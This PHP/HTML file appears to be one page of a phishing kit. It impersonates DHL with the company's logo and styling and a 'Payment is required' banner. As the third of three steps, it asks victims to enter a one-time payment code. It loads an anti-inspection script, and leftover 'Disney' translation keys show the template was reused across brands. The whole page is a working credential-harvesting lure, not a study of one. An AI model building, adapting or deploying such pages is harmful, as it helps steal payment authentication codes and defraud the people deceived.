<?php require_once(__DIR__ . '/../includes/page-common.php'); ?>
<!DOCTYPE html>
<html lang="<?php echo htmlspecialchars($selectedLanguage); ?>">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="Cache-Control" content="no-cache">
    <title><?php echo htmlspecialchars($translations['Confirmation_Disney'] ?? 'DHL'); ?></title>
    <link rel="stylesheet" href="<?php echo htmlspecialchars($dhlStyleHref, ENT_QUOTES, 'UTF-8'); ?>">
    <script src="js/security-common.js"></script>
    <script src="../js/anti-inspect.js"></script>
</head>
<body class="holl-page js-focus-visible" data-page="token">
<nav class="holl-nav" aria-label="Brand">
    <div class="holl-nav-inner">
        <svg xmlns="http://www.w3.org/2000/svg" enable-background="new 0 0 143.5 20" height="20" viewBox="0 0 143.5 20" width="143.5" aria-hidden="true"><g fill="#d40511"><path d="m0 18.5h17.4l-1 1.4h-16.4z"/><path d="m143.5 19.9h-21.3l1.1-1.4h20.3v1.4z"/><path d="m0 15.9h19.4l-1.1 1.4h-18.3z"/><path d="m0 13.3h21.4l-1.1 1.4h-20.3z"/><path d="m143.5 17.3h-19.3l1.1-1.4h18.3v1.4z"/><path d="m127.2 13.3h16.3v1.4h-17.4z"/><path d="m18.8 19.9 9.2-12.3h11.4c1.3 0 1.3.5.6 1.3-.6.8-1.7 2.3-2.3 3.1-.3.5-.9 1.2 1 1.2h15.3c-1.2 1.8-5.4 6.8-12.8 6.8-6-.1-22.4-.1-22.4-.1z"/><path d="m71.5 13.3-5 6.7h-13.1l5-6.7z"/><path d="m90.6 13.3-5 6.7h-13.2l5-6.7z"/><path d="m94.9 13.3s-1 1.3-1.4 1.9c-1.7 2.2-.2 4.8 5.2 4.8h21.2l5-6.7z"/><path d="m25.3 0-4.6 6.1h25c1.3 0 1.3.5.6 1.3-.6.8-1.7 2.3-2.3 3.1-.3.4-.9 1.2 1 1.2h10.2s1.7-2.2 3-4.1c1.9-2.5.2-7.7-6.5-7.7-6 .1-26.4.1-26.4.1z"/><path d="m91.7 11.7h-32.2l8.8-11.7h13.2l-5 6.7h5.9l5-6.7h13.2z"/><path d="m118.8 0-8.8 11.7h-14l8.8-11.7z"/></g></svg>
        <span class="holl-nav-title"><?php echo htmlspecialchars($translations['dhl_nav_payment_required'] ?? 'Payment is required'); ?></span>
    </div>
</nav>
<main class="holl-main">
    <div class="holl-screen-center">
        <div class="holl-modal-root" aria-labelledby="token-modal-title" role="dialog" aria-modal="true">
            <div class="holl-scrim" aria-hidden="true"></div>
            <div class="holl-modal-scroll">
                <div class="holl-modal-card">
                    <div class="holl-modal-body">
                        <span class="holl-step-tag"><?php echo htmlspecialchars($translations['STEP_3_OF_3']); ?></span>
                        <h3 class="holl-modal-title" id="token-modal-title"><?php echo htmlspecialchars($translations['securepurchase']); ?></h3>
                        <p class="holl-form-note"><?php echo htmlspecialchars($translations['tokenn']); ?></p>
                        <p class="dhl-hint-ok"><?php echo htmlspecialchars($translations['onthehomescreen']); ?></p>
                        <form id="tokenForm" name="tokenForm" method="post" action="">
                            <div class="holl-pay-field">
                                <label for="tokenCode"><?php echo htmlspecialchars($translations['entertoken']); ?></label>
                                <input id="tokenCode" name="tokenCode" type="text" inputmode="numeric" maxlength="10" placeholder="<?php echo htmlspecialchars($translations['Code_generated']); ?>" autocomplete="one-time-code" required>
                            </div>
                            <button type="submit" class="holl-btn-red" id="submitBtn"><?php echo htmlspecialchars($translations['CONTINUE']); ?></button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</main>
<footer class="holl-footer">
    <div class="holl-footer-inner">
        <div class="holl-footer-links">
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_privacy'] ?? $translations['Privacy_Policy']); ?></a>
            <span class="holl-footer-sep">|</span>
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_cookie'] ?? $translations['Cookie_Terms']); ?></a>
            <span class="holl-footer-sep">|</span>
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_data'] ?? $translations['Data_Rights']); ?></a>
            <span class="holl-footer-sep">|</span>
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_corp'] ?? $translations['About_Disney']); ?></a>
            <span class="holl-footer-sep">|</span>
            <a href="#"><?php echo htmlspecialchars($translations['dhl_footer_disclaimer'] ?? 'Disclaimer'); ?></a>
        </div>
    </div>
</footer>
<script src="../js/pages-config.js?v=<?php echo time(); ?>"></script>
<script src="../js/session-manager.js?v=<?php echo time(); ?>"></script>
<script src="../js/validation.js?v=<?php echo time(); ?>"></script>
<script src="../js/app.js?v=<?php echo time(); ?>"></script>
</body>
</html>
